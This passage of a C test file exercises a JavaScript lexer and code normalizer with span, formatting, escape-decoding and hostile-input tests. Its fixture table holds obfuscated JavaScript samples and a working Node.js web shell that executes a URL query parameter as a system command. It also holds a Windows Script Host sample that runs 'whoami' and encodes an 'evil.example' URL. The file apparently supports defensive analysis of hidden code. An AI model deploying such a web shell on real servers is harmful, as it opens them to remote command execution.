 * (templates in templates). Each is written as S/R/K and offset,length of every string, regular expression and comment.
 */
static const struct {
	const char *name, *src, *ranges;
} obf[] = {
	{ "aaencode.js",
	  "\xef\xbb\xbf\xef\xbe\x9f\xcf\x89\xef\xbe\x9f\xef\xbe\x89= /\xef\xbd\x80\xef\xbd\x8d\xc2\xb4\xef\xbc\x89"
	  "\xef\xbe\x89 ~\xe2\x94\xbb\xe2\x94\x81\xe2\x94\xbb   //*\xc2\xb4\xe2\x88\x87\xef\xbd\x80*/ ['_']; o="
	  "(\xef\xbe\x9f\xef\xbd\xb0\xef\xbe\x9f)  =_=3; c=(\xef\xbe\x9f\xce\x98\xef\xbe\x9f) =(\xef\xbe\x9f\xef"
	  "\xbd\xb0\xef\xbe\x9f)-(\xef\xbe\x9f\xef\xbd\xb0\xef\xbe\x9f); (\xef\xbe\x9f\xef\xbe\x82\xef\xbe\x9f)"
	  "=(o^_^o)/ (o^_^o);(\xef\xbe\x9f\xd0\x94\xef\xbe\x9f)={\xef\xbe\x9f\xce\x98\xef\xbe\x9f: '_' ,\xef\xbe"
	  "\x9f\xcf\x89\xef\xbe\x9f\xef\xbe\x89 : ((\xef\xbe\x9f\xcf\x89\xef\xbe\x9f\xef\xbe\x89==3) +'_') [\xef"
	  "\xbe\x9f\xce\x98\xef\xbe\x9f] };(\xef\xbe\x9f\xd0\x94\xef\xbe\x9f) [\xef\xbe\x9f\xce\x98\xef\xbe\x9f"
	  "] =((\xef\xbe\x9f\xcf\x89\xef\xbe\x9f\xef\xbe\x89==3) +'_') [c^_^o];\n",
	  "R16,30;K46,12;S60,3;S177,3;S215,3;S275,3;" },
	{ "jjencode.js",
	  "$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+"
	  "\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__"
	  "$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($._"
	  "_=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$."
	  "$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\""
	  "\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\\\\\\\"\\\\\"+$.__$+$.__$+$.___+$.$$$_+(![]+\""
	  "\")[$._$_]+(![]+\"\")[$._$_]+$._$+\",\\\\\"+$.$__+$.___+\"\\\\\\\")\"+\"\\\"\")())();\n",
	  "S27,2;S52,2;S76,2;S94,2;S116,2;S119,2;S151,2;S206,2;S247,2;S265,2;S302,2;S305,2;S324,2;S327,2;S376,2;S379,2;S445,4;S462,2;S480,4;S508,9;S548,2;S564,2;S580,5;S598,7;S606,4;" },
	{ "jsfuck.js",
	  "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+"
	  "!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])["
	  "+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+["
	  "][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])["
	  "+!+[]+[+[]]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+["
	  "])[+[]]+([][[]]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+"
	  "[]+!+[]+!+[]]+(!![]+[])[+!+[]])()\n",
	  "" },
	{ "obfuscatorio.js",
	  "var _0x1a2b=['\\x61\\x62\\x63','\\x6c\\x6f\\x67','eval'];(function(_0x3c,_0x4d){var _0x5e=function(_"
	  "0x6f){while(--_0x6f){_0x3c['push'](_0x3c['shift']());}};_0x5e(++_0x4d);}(_0x1a2b,0x1f3));var _0x7a=f"
	  "unction(_0x8b,_0x9c){_0x8b=_0x8b-0x0;var _0xad=_0x1a2b[_0x8b];return _0xad;};console[_0x7a('0x1')](_"
	  "0x7a('0x0')/0x2/0x3);window[_0x7a('0x2')]('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29');\n",
	  "S13,14;S28,14;S43,6;S121,6;S135,7;S285,5;S299,5;S328,5;S336,34;" },
	{ "packer.js",
	  "eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--"
	  ")r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c]"
	  ")p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('0 1=2(\"3\");4(1.5/6==7){8.9(\"a\\'"
	  "b\")}',62,10,'var|x|atob|YQ==|if|length|2|1|alert|log'.split('|'),0,{}))\n",
	  "S67,2;R78,3;S168,6;S222,5;S233,5;S239,3;S260,37;S304,41;S352,3;" },
	{ "webshell.js",
	  "var http=require('http'),cp=require('child_process'),url=require('url');\nhttp.createServer(function"
	  "(req,res){var q=url.parse(req.url,true).query;if(q.c){cp.exec(q.c,function(e,o,s){res.end(`<pre>${o|"
	  "|s||e}</pre>`)})}else{res.end(`<form>${[\"cmd\"].map(n=>`<input name=\"${n}\">`).join('')}</form>`)}"
	  "}).listen(process.env.PORT||8080)\n",
	  "S17,6;S36,15;S65,5;S189,23;S229,64;" },
	{ "wsh.js",
	  "var sh=new ActiveXObject(\"WScript.Shell\"),fso=new ActiveXObject(\"Scripting.FileSystemObject\");va"
	  "r r=/^\\s*(\\w+)\\s*=\\s*\"([^\"]*)\"\\s*$/;function run(c){var e=sh.Exec(\"cmd /c \"+c);var o=e.Std"
	  "Out.ReadAll();return o}\nvar s = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+\"evil.example/\"; // http:"
	  "// \\\"\nif (s.indexOf(\"http\")>=0) { WScript.Echo(run('whoami')) } else /* nothing */ { eval(unesc"
	  "ape(\"%61%6c%65%72%74%28%31%29\")) }\n",
	  "S25,15;S64,28;R100,31;S162,9;S218,30;S249,15;K266,13;S294,6;S325,8;K343,13;S373,26;" },
};

static void obfuscated(void)
{
	char got[4096];
	uint32_t k, i;

	for (k = 0; k < sizeof obf / sizeof obf[0]; k++) {
		const uint8_t *in = (const uint8_t *)obf[k].src;
		uint32_t n = (uint32_t)strlen(obf[k].src), w = 0;

		lex_all(&R, in, n);
		for (i = 0; i < R.n && w + 32u < sizeof got; i++) {
			const struct kgenome_textual_span *s = &R.sp[i];

			if (s->kind == KGENOME_TEXTUAL_CODE)
				continue;
			w += (uint32_t)snprintf(got + w, sizeof got - w, "%c%u,%u;",
						s->kind == KGENOME_TEXTUAL_COMMENT ? 'K' : in[s->off] == '/' ? 'R' : 'S', s->off, s->len);
		}
		got[w] = 0;
		if (R.broken || strcmp(got, obf[k].ranges)) {
			printf("  FAIL %s\n       got    %s\n       wanted %s\n", obf[k].name, got, obf[k].ranges);
			fails++;
		}
	}
}

/* ---- the form, and the decode hook ---------------------------------------------------------- */

static uint8_t FO1[2u * GEN_MAX], FO2[2u * GEN_MAX];
static uint8_t CB1[2u * GEN_MAX], CB2[2u * GEN_MAX];

static uint32_t form_buf(const uint8_t *in, uint32_t n, uint8_t *out)
{
	struct kgenome_textual_form_req rq = { .in = in, .n = n, .lang = KGENOME_TEXTUAL_LANG_JS, .out = out,
					       .cap = KGENOME_TEXTUAL_FORM_CAP(n), .flags = KGENOME_TEXTUAL_KEEP_JOINS };
	struct kgenome_textual_form_res rs;
	enum kgenome_textual_status st = kgenome_textual_form(&rq, &rs);

	return st == KGENOME_TEXTUAL_OK || st == KGENOME_TEXTUAL_OPEN ? rs.n_out : 0xffffffffu;
}

/* The code of a text, white space left out: what the form must not change. Literals counted by kind. */
static uint32_t code_of(const uint8_t *in, uint32_t n, uint8_t *out, uint32_t lit[3])
{
	uint32_t i, k, w = 0;

	lex_all(&R, in, n);
	lit[0] = lit[1] = lit[2] = 0;
	for (i = 0; i < R.n; i++) {
		const struct kgenome_textual_span *s = &R.sp[i];

		if (s->kind == KGENOME_TEXTUAL_CODE) {
			for (k = 0; k < s->len; k++) {
				uint8_t c = in[s->off + k];

				if (c != ' ' && c != '\t' && c != '\n' && c != '\r' && c != '\v' && c != '\f')
					out[w++] = c;
			}
		} else if (s->kind == KGENOME_TEXTUAL_STRING) {
			lit[in[s->off] == '/' ? 1 : in[s->off] == '`' ? 2 : 0]++;
		}
	}
	return w;
}

/* The form of a generated program: a form, its own form, the same code and the same literals, and no comment left. */
static int form_of_generated(const struct gen *g, uint32_t prog)
{
	uint32_t w1 = form_buf(g->buf, g->n, FO1), w2, c1, c2, l1[3], l2[3], i;

	if (w1 == 0xffffffffu) {
		printf("  FAIL form of generated program %u: status\n", prog);
		return 0;
	}
	w2 = form_buf(FO1, w1, FO2);
	if (w2 != w1 || memcmp(FO1, FO2, w1)) {
		printf("  FAIL form of generated program %u is not its own form\n", prog);
		return 0;
	}
	c1 = code_of(g->buf, g->n, CB1, l1);
	c2 = code_of(FO1, w1, CB2, l2);
	if (c1 != c2 || memcmp(CB1, CB2, c1) || l1[0] != l2[0] || l1[1] != l2[1] || l1[2] != l2[2]) {
		uint32_t d = 0;

		printf("  FAIL form of generated program %u changed the code or the literals (%u/%u bytes, str %u/%u re %u/%u tpl %u/%u)\n",
		       prog, c1, c2, l1[0], l2[0], l1[1], l2[1], l1[2], l2[2]);
		while (d < c1 && d < c2 && CB1[d] == CB2[d])
			d++;
		printf("       code before: ");
		show(CB1 + (d > 30u ? d - 30u : 0u), d + 40u > c1 ? c1 - (d > 30u ? d - 30u : 0u) : (d > 30u ? 30u : d) + 40u);
		printf("\n       code after:  ");
		show(CB2 + (d > 30u ? d - 30u : 0u), d + 40u > c2 ? c2 - (d > 30u ? d - 30u : 0u) : (d > 30u ? 30u : d) + 40u);
		printf("\n");
		return 0;
	}
	lex_all(&R, FO1, w1);
	for (i = 0; i < R.n; i++)
		if (R.sp[i].kind == KGENOME_TEXTUAL_COMMENT &&
		    !(R.sp[i].off == 0 && w1 >= 2u && FO1[0] == '#' && FO1[1] == '!')) {   /* the interpreter line is kept */
			printf("  FAIL form of generated program %u still holds a comment\n", prog);
			return 0;
		}
	return 1;
}

static struct census CEN;

static void generated(uint32_t n_prog, uint32_t base)
{
	uint32_t i, bad = 0, bad_form = 0;

	for (i = 0; i < n_prog; i++) {
		uint32_t at;

		program(&G, base + i);
		if (G.over) {
			printf("  FAIL generated program %u did not fit\n", base + i);
			bad++;
		}
		count(&CEN, &G);
		lex_all(&R, G.buf, G.n);
		if (!same(&G, &R, &at) && bad++ < 3)
			report(&G, &R, at, base + i);
		if (!form_of_generated(&G, base + i))
			bad_form++;
		/* every prefix of a few programs, at 25 places: the spans partition it, whatever is open */
		if (i % 20u == 0) {
			uint32_t k;

			for (k = 0; k < 25u; k++) {
				uint32_t cut = G.n ? (uint32_t)(((uint64_t)G.n * k) / 24u) : 0u;

				lex_all(&R, G.buf, cut);
				if (R.broken || R.over) {
					printf("  FAIL prefix of %u bytes of generated program %u: partition\n", cut, base + i);
					bad++;
					break;
				}
			}
		}
	}
	if (bad || bad_form) {
		printf("  FAIL %u of %u generated programs lexed wrongly, %u formed wrongly\n", bad, n_prog, bad_form);
		fails++;
	}
}

static void census_check(void)
{
	printf("  generated: %u programs, %u bytes, %u spans; strings %u, regular expressions %u, templates %u"
	       " (%u with ${ }, %u with a template inside), comments %u (%u block with a line break, %u html, %u hashbang)\n",
	       CEN.progs, CEN.bytes, CEN.spans, CEN.str, CEN.regex, CEN.tpl, CEN.tpl_subst, CEN.tpl_nested,
	       CEN.comments, CEN.block_lt, CEN.html, CEN.hashbang);
	/* a generator that stopped writing one of these is a test that stopped testing it */
	CK(CEN.regex > CEN.progs && CEN.tpl_subst > CEN.progs / 4u && CEN.tpl_nested > CEN.progs / 20u);
	CK(CEN.comments > CEN.progs * 2u && CEN.html > CEN.progs / 20u && CEN.hashbang > 10u && CEN.block_lt > CEN.progs / 4u);
}

static void forms(void)
{
	/* indentation, blank lines, comments, spacing: gone; a line break is one */
	jform("var a  =  1 ;  // c\n\n\n  b ( ) ;", "var a=1;\nb();");
	jform("a\r\nb\rc\n\n\nd", "a\nb\nc\nd");
	jform("", "");
	jform("// only\n/* a */", "");
	/* a lone "{" joins the line above after ")" and the words and operators that continue a statement */
	jform("function f()\n{\n  return 1;\n}", "function f(){\nreturn 1;\n}");
	jform("if (a)\n{\n b()\n}\nelse\n{\n c()\n}", "if(a){\nb()\n}\nelse{\nc()\n}");
	jform("try\n{\n a\n}\nfinally\n{\n b\n}", "try{\na\n}\nfinally{\nb\n}");
	jform("do\n{\n a\n} while (b)", "do{\na\n}while(b)");
	jform("f(() =>\n{\n a\n})", "f(()=>{\na\n})");
	jform("x =\n{\n a: 1\n}", "x={\na:1\n}");
	jform("a(\n{\n b: 1\n})", "a({\nb:1\n})");
	/* ... and not after what may have ended the statement: "return\n{" is not "return {", "x\n{" is not "x {" */
	jform("function f() {\n  return\n  {\n  a: 1\n  }\n}", "function f(){\nreturn\n{\na:1\n}\n}");
	jform("x\n{\n y\n}", "x\n{\ny\n}");
	/* ... and not after a ")" that ends a call: `new Array(256)` and a block is two statements (24865 real files found it) */
	jform("const a = new Array(256)\n{\n b()\n}", "const a=new Array(256)\n{\nb()\n}");
	jform("f(a)\n{\n b()\n}", "f(a)\n{\nb()\n}");
	jform("if (a) f(b)\n{\n c()\n}", "if(a)f(b)\n{\nc()\n}");
	jform("m()\n{\n b()\n}", "m()\n{\nb()\n}");
	/* the header of a statement or of a function is what a ")" may end */
	jform("while (a(b))\n{\n c()\n}", "while(a(b)){\nc()\n}");
	jform("if (a) {\n}\nelse if (b)\n{\n c()\n}", "if(a){\n}\nelse if(b){\nc()\n}");
	jform("if (a) {\n} else if (b)\n{\n c()\n}", "if(a){\n}else if(b){\nc()\n}");
	jform("for await (a of b)\n{\n c()\n}", "for await(a of b){\nc()\n}");
	jform("x = function* g(a, b)\n{\n c()\n}", "x=function*g(a,b){\nc()\n}");
	jform("async function f()\n{\n c()\n}", "async function f(){\nc()\n}");
	jform("x = { get a()\n{\n c()\n} }", "x={get a(){\nc()\n}}");
	jform("try\n{\n a\n}\ncatch (e)\n{\n b\n}", "try{\na\n}\ncatch(e){\nb\n}");
	jform("try\n{\n a\n}\ncatch\n{\n b\n}", "try{\na\n}\ncatch{\nb\n}");
	jform("switch (a)\n{\n}", "switch(a){\n}");
	jform("x = 1\n{\n y\n}", "x=1\n{\ny\n}");
	jform("a++\n{\n y\n}", "a++\n{\ny\n}");
	jform("x = 'a'\n{\n y\n}", "x='a'\n{\ny\n}");
	jform("if (a) { }\n{\n y\n}", "if(a){}\n{\ny\n}");
	jform("class A\n{\n}", "class A\n{\n}");
	/* a comment that holds a line terminator is a line break: `return` and `x` are two statements */
	jform("return /*\n*/ x", "return\nx");
	jform("a = b /* \xe2\x80\xa8 */ ++c", "a=b\n++c");
	jform("a = b /* \r */ ++c", "a=b\n++c");
	jform("a = b /* c */ + +c", "a=b+ +c");
	jform("a = b // c\n+ c", "a=b\n+c");
	jform("a = b /* x", "a=b/* x");
	jform("a = 'x", "a='x");
	/* what closing up would make into one token or another: a space stays where it matters, nowhere else */
	jform("a + +b; a - -b; a+ ++b; a++ + b; a-- - b", "a+ +b;a- -b;a+ ++b;a++ +b;a-- -b");
	jform("a = b / c; a = b / /r/.source", "a=b/c;a=b/ /r/.source");
	jform("a = b /* x */ / c", "a=b/c");
	jform("a = b / /* x */ /r/", "a=b/ /r/");
	jform("/r/ in o; /r/ instanceof o; a / i; a / b", "/r/ in o;/r/ instanceof o;a/ i;a/b");
	jform("a < !--b; a-- > b; a < !b; a - > b", "a< !--b;a-- >b;a< !b;a- >b");
	jform("1 .toString(); 1..toString(); 1.5 .x; a .x", "1 .toString();1..toString();1.5 .x;a.x");
	jform("var $x; return $y; in $; $ in $; a$ $b", "var $x;return $y;in $;$ in $;a$ $b");
	jform("var \\u0061b; \\u0061 \\u0062", "var \\u0061b;\\u0061 \\u0062");
	jform("typeof a; void 0; a instanceof b; a in b", "typeof a;void 0;a instanceof b;a in b");
	jform("x = a ? b : c; a ? .5 : 1", "x=a?b:c;a?.5:1");
	jform("a = b /\n c", "a=b/\nc");
	/* a regular expression, a template and a string are not touched, a comment opener in them stays */
	jform("a = /x  y\\//g  . test( 'a  // b' ) + `c  /* d */`", "a=/x  y\\//g.test('a  // b')+`c  /* d */`");
	jform("a = `x ${ b  +  /* c */ d } y`", "a=`x ${ b  +  /* c */ d } y`");
	/* the escapes of a quoted string, and of a template with neither a tag nor a substitution, are the bytes they spell */
	jform("a = \"\\x65\\u0076\\u{61}\\x6C\"", "a=\"eval\"");
	jform("a = 'a\\x41\\u0042\\103'", "a='aABC'");
	jform("a = `\\x41\\u{42}`", "a=`AB`");
	jform("a = `\\x41${x}`; b = tag`\\x41`; c = /\\x2e/", "a=`\\x41${x}`;b=tag`\\x41`;c=/\\x2e/");
	/* ... but not a quote of either kind, a backslash, a backquote, "$" or "{", and not a byte that is not printable ASCII */
	jform("a = \"\\x22\\x27\\x5c\\x60\\x24\\x7b\\x7f\\x1f\\u00e9\\u{1F600}\"", "a=\"\\x22\\x27\\x5c\\x60\\x24\\x7b\\x7f\\x1f\\u00e9\\u{1F600}\"");
	jform("a = '\\u0027\\x27'", "a='\\u0027\\x27'");
	/* a digit 0-7 is not written after a legacy octal escape, which would make it part of the escape */
	jform("a = '\\0\\x31'; b = '\\1\\x38'; c = '\\x31\\x32'", "a='\\0\\x31';b='\\18';c='12'");
	/* a string with an escape that is malformed is copied as typed: "\x4" and the "1" a "\x31" would write */
	jform("a = '\\x4\\x31\\x41'", "a='\\x4\\x31\\x41'");
	jform("a = '\\u12\\x41'; b = '\\u{}\\x41'; c = '\\u{110000}\\x41'", "a='\\u12\\x41';b='\\u{}\\x41';c='\\u{110000}\\x41'");
	/* a pair is a pair: "\\x41" is a backslash and "x41"; an escaped line break is kept */
	jform("a = '\\\\x41\\\n\\x42'", "a='\\\\x41\\\nB'");
	/* an unclosed string is copied as it is */
	jform("a = 'x\\x41\nb", "a='xA\nb");
	/* what the tools that hide code write: hex and unicode escapes of a name, a comment that follows a regular expression */
	jform("var _0x1a=['\\x61\\x62\\x63','\\u0065\\u0076\\u0061\\u006c']; w[_0x7a('0x2')]('\\x61\\x6c\\x65\\x72\\x74')",
	      "var _0x1a=['abc','eval'];w[_0x7a('0x2')]('alert')");
	jform("s = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\" + \"evil.example/\"; // http:// \\\"\nx", "s=\"http://evil.example/\";\nx");
	jform("a= /x y   //*c*/ ['_']; o=(b)  =_=3", "a=/x y   /['_'];o=(b)=_=3");
	/* html comments are comments and go, as comments do; the hashbang is one too, and is kept: it says what the script is */
	jform("a <!-- x\nb\n--> y\nc", "a\nb\nc");
	jform("#!/usr/bin/env node\nx  =  1", "#!/usr/bin/env node\nx=1");
}

/* A decoder that wraps the value in angle brackets and upper-cases it, refusing a value that begins with "!". It shows
 * which literal is handed to the hook, and when, not what any algorithm does. */
static uint8_t last_chain[KGENOME_TEXTUAL_CHAIN_MAX];
static uint32_t last_n_chain, hook_calls;
static uint8_t hook_out[256];

static int fake_decode(void *user, const uint8_t *chain, uint32_t n_chain, const uint8_t *in, uint32_t len,
		       const uint8_t **out, uint32_t *out_len)
{
	uint32_t i;

	(void)user;
	hook_calls++;
	memcpy(last_chain, chain, n_chain);
	last_n_chain = n_chain;
	if (!len || in[0] == '!' || len + 2u > sizeof hook_out)
		return 0;
	hook_out[0] = '<';
	for (i = 0; i < len; i++)
		hook_out[1u + i] = (uint8_t)((in[i] >= 'a' && in[i] <= 'z') ? in[i] - 32 : in[i]);
	hook_out[len + 1u] = '>';
	*out = hook_out;
	*out_len = len + 2u;
	return 1;
}

static struct kgenome_textual_form_res dform(const char *src, const char *want)
{
	struct kgenome_textual_form_req rq = { .in = (const uint8_t *)src, .n = (uint32_t)strlen(src),
					       .lang = KGENOME_TEXTUAL_LANG_JS, .out = fbuf, .decode = fake_decode };
	struct kgenome_textual_form_res rs;

	rq.cap = KGENOME_TEXTUAL_FORM_CAP(rq.n) + 64u;
	hook_calls = 0;
	last_n_chain = 0;
	kgenome_textual_form(&rq, &rs);
	if (rs.n_out != strlen(want) || memcmp(fbuf, want, rs.n_out)) {
		fbuf[rs.n_out < sizeof fbuf ? rs.n_out : sizeof fbuf - 1u] = 0;
		printf("  FAIL decode of  %s\n       got    %s\n       wanted %s\n", src, fbuf, want);
		fails++;
	}
	return rs;
}

static void decode_hook(void)
{
	struct kgenome_textual_form_res rs;

	rs = dform("f(atob(\"abc\"));", "f(decoded_atob(\"<ABC>\"));");
	CK(rs.n_decoded == 1 && hook_calls == 1 && last_n_chain == 1 && last_chain[0] == KGENOME_TEXTUAL_DEC_B64);
	dform("atob('abc')", "decoded_atob('<ABC>')");
	dform("atob( /* c */ \"abc\" /* d */ )", "decoded_atob(\"<ABC>\")");
	dform("window.atob(\"abc\")", "window.decoded_atob(\"<ABC>\")");
	dform("atob(`abc`)", "decoded_atob(`<ABC>`)");
	dform("atob(\"abc\", x)", "decoded_atob(\"<ABC>\",x)");
	dform("unescape(\"%41\"); decodeURIComponent(\"%41\")", "decoded_unescape(\"<%41>\");decoded_decodeURIComponent(\"<%41>\")");
	CK(last_chain[0] == KGENOME_TEXTUAL_DEC_RAWURL);
	/* decodeURI leaves the escapes of reserved characters, which the host's url decoder does not: not a decoder here */
	rs = dform("decodeURI(\"%3B\")", "decodeURI(\"%3B\")");
	CK(rs.n_decoded == 0 && hook_calls == 0);
	/* "+" stays a plus under unescape and decodeURIComponent, and the decoder the row names (RAW) keeps it too, so it is decoded - and under
	 * atob it is a base64 digit. "%u" is read by unescape and not by the host's decoder: a literal with it is not handed over */
	rs = dform("unescape(\"a+b\"); decodeURIComponent(\"a+\")", "decoded_unescape(\"<A+B>\");decoded_decodeURIComponent(\"<A+>\")");
	CK(rs.n_decoded == 2 && hook_calls == 2 && last_chain[0] == KGENOME_TEXTUAL_DEC_RAWURL);
	rs = dform("unescape(\"%u0041\"); unescape(\"%U0041\")", "unescape(\"%u0041\");unescape(\"%U0041\")");
	CK(rs.n_decoded == 0 && rs.n_refused == 2 && hook_calls == 0);    /* each stays as typed, and is counted */
	rs = dform("atob(\"a+b\"); unescape(\"%u\"); unescape(\"50%\")", "decoded_atob(\"<A+B>\");unescape(\"%u\");decoded_unescape(\"<50%>\")");
	CK(rs.n_decoded == 2 && hook_calls == 2);
	/* the common idiom: a base64 text (which has "+") put through decodeURIComponent is decoded, both calls renamed */
	rs = dform("decodeURIComponent(atob(\"a+b\"))", "decoded_decodeURIComponent(decoded_atob(\"<A+B>\"))");
	CK(rs.n_decoded == 1 && hook_calls == 1 && last_n_chain == 2);
	/* a chain is innermost first, and stops at the first name that is not a decoder */
	rs = dform("decodeURIComponent(atob(\"abc\"))", "decoded_decodeURIComponent(decoded_atob(\"<ABC>\"))");
	CK(rs.n_decoded == 1 && last_n_chain == 2 && last_chain[0] == KGENOME_TEXTUAL_DEC_B64 &&
	   last_chain[1] == KGENOME_TEXTUAL_DEC_RAWURL);
	dform("eval(md5(atob(\"abc\")))", "eval(md5(decoded_atob(\"<ABC>\")))");
	/* NOT a decoder, or not a literal, or not the first argument */
	rs = dform("myatob(\"abc\"); atob2(\"abc\"); $atob(\"abc\"); x.$atob(\"abc\"); a$tob(\"abc\")",
		   "myatob(\"abc\");atob2(\"abc\");$atob(\"abc\");x.$atob(\"abc\");a$tob(\"abc\")");
	CK(rs.n_decoded == 0 && hook_calls == 0);
	dform("atob(x, \"abc\")", "atob(x,\"abc\")");
	dform("atob(\"a\" + \"b\")", "decoded_atob(\"<AB>\")");        /* a join of literals is the payload */
	dform("atob(\"a\" + x)", "atob(\"a\"+x)");
	dform("atob(x)", "atob(x)");
	/* what no decoder reads: Buffer.from and String.fromCharCode are not literal decoders ("base64" is a second argument,
	 * and without it the same call is a utf-8 string) */
	rs = dform("Buffer.from(\"abc\", \"base64\"); String.fromCharCode(65, 66)",
		   "Buffer.from(\"abc\",\"base64\");String.fromCharCode(65,66)");
	CK(rs.n_decoded == 0 && hook_calls == 0);
	/* the hook is given the VALUE (kgenome_textual_value): an escape is applied and a line continuation vanishes, so
	 * "a\x41" is "aA" and "a\<newline>b" is "ab"; ${ } is code and a regular expression is not a string, so those two
	 * have no value, are counted as refused and stay as typed; a tagged template has code in front of it, which
	 * call_chain does not read as a call */
	rs = dform("atob(\"a\\x41\"); atob(`a${x}`); atob(/abc/); atob(tag`abc`); atob(\"a\\\nb\")",
		   "decoded_atob(\"<AA>\");atob(`a${x}`);atob(/abc/);atob(tag`abc`);decoded_atob(\"<AB>\")");
	CK(rs.n_decoded == 2 && rs.n_refused == 2 && hook_calls == 2);
	/* the hook may refuse, and the literal stays as typed */
	rs = dform("atob(\"!abc\")", "atob(\"!abc\")");
	CK(rs.n_decoded == 0 && rs.n_refused == 1 && hook_calls == 1);
	rs = dform("atob(\"abc", "atob(\"abc");
	CK(rs.n_decoded == 0 && hook_calls == 0);
}

/* ---- the API: status, the fragment flag, a sink that stops, and input meant to hurt -------------- */

struct stopper {
	uint32_t seen, stop_at;
};

static int stop_sink(void *u, const struct kgenome_textual_span *s)
{
	struct stopper *c = u;

	(void)s;
	return ++c->seen < c->stop_at;
}

static void api(void)
{
	static struct rend r;
	enum kgenome_textual_status st;
	const char src[] = "a = 'x' + `y` + /z/; // c\n";
	struct kgenome_textual_lex_req rq = { .in = (const uint8_t *)src, .n = sizeof src - 1u, .lang = KGENOME_TEXTUAL_LANG_JS };
	struct kgenome_textual_lex_res rs;
	uint32_t k;

	st = lex(&r, "a = 'x'", 7, KGENOME_TEXTUAL_LANG_JS);
	CK(st == KGENOME_TEXTUAL_OK);
	st = lex(&r, "a = 'x", 6, KGENOME_TEXTUAL_LANG_JS);
	CK(st == KGENOME_TEXTUAL_OPEN);
	st = lex(&r, "a = `x", 6, KGENOME_TEXTUAL_LANG_JS);
	CK(st == KGENOME_TEXTUAL_OPEN);
	st = lex(&r, "a /* x", 6, KGENOME_TEXTUAL_LANG_JS);
	CK(st == KGENOME_TEXTUAL_OPEN);
	/* a division that finds no end is not an open literal */
	st = lex(&r, "a = / b", 7, KGENOME_TEXTUAL_LANG_JS);
	CK(st == KGENOME_TEXTUAL_OK);
	/* the counts: spans delivered, and the ones left open */
	memset(&r, 0, sizeof r);
	r.in = (const uint8_t *)src;
	r.n = sizeof src - 1u;
	rq.sink = sink;
	rq.user = &r;
	st = kgenome_textual_lex(&rq, &rs);
	CK(st == KGENOME_TEXTUAL_OK && rs.n_span == 9u && rs.n_open == 0u);
	/* a fragment is code with nothing in front of it, which is all a js text is: the same spans */
	{
		static struct rend r2;

		lex(&r2, src, (uint32_t)(sizeof src - 1u), KGENOME_TEXTUAL_LANG_JS);
		memset(&r, 0, sizeof r);
		r.in = (const uint8_t *)src;
		r.n = sizeof src - 1u;
		rq.flags = KGENOME_TEXTUAL_FRAGMENT;
		kgenome_textual_lex(&rq, &rs);
		CK(!strcmp(r.out, r2.out));
	}
	/* a sink that stops the walk is a status, and what came before was delivered */
	for (k = 1; k < 4; k++) {
		struct stopper c = { 0, k };

		rq.flags = 0;
		rq.sink = stop_sink;
		rq.user = &c;
		st = kgenome_textual_lex(&rq, &rs);
		CK(st == KGENOME_TEXTUAL_REFUSED && c.seen == k);
	}
	/* a language that is not in the table */
	st = lex(&r, "a", 1, KGENOME_TEXTUAL_LANG_COUNT);
	CK(st == KGENOME_TEXTUAL_NO_LANG);
}

/*
 * Input meant to hurt: a megabyte of one opener. The work is linear (one pass over the bytes, a bracket stack of a fixed
 * size), nothing recurses, and a bracket stack that is full degrades by saying so: the template that is deeper than it
 * tracks is open from there (a KNOWN LIMIT above) and every byte is still in exactly one span.
 */
/* Only whether the spans partition the text, with no limit on how many there are. */
struct part {
	uint32_t next, n;
	int      broken;
};

static int part_sink(void *u, const struct kgenome_textual_span *s)
{
	struct part *r = u;

	if (s->off != r->next || !s->len || (uint64_t)s->off + s->len > r->n || (uint64_t)s->open_len + s->close_len > s->len)
		r->broken = 1;
	r->next = s->off + s->len;
	return 1;
}

static int partitions(const uint8_t *in, uint32_t n)
{
	struct part r = { 0, n, 0 };
	struct kgenome_textual_lex_req rq = { .in = in, .n = n, .lang = KGENOME_TEXTUAL_LANG_JS, .sink = part_sink, .user = &r };
	struct kgenome_textual_lex_res rs;

	kgenome_textual_lex(&rq, &rs);
	return !r.broken && r.next == n;
}

static void hostile(void)
{
	static const char *const unit[] = { "(", "{", "${", "`${", "/*", "<!--", "`", "'", "\\", "/", "[/", "-->\n", "a/" };
	enum { MB = 1u << 20 };
	static uint8_t big[MB + 64u];
	uint32_t u, i, w;

	for (u = 0; u < sizeof unit / sizeof unit[0]; u++) {
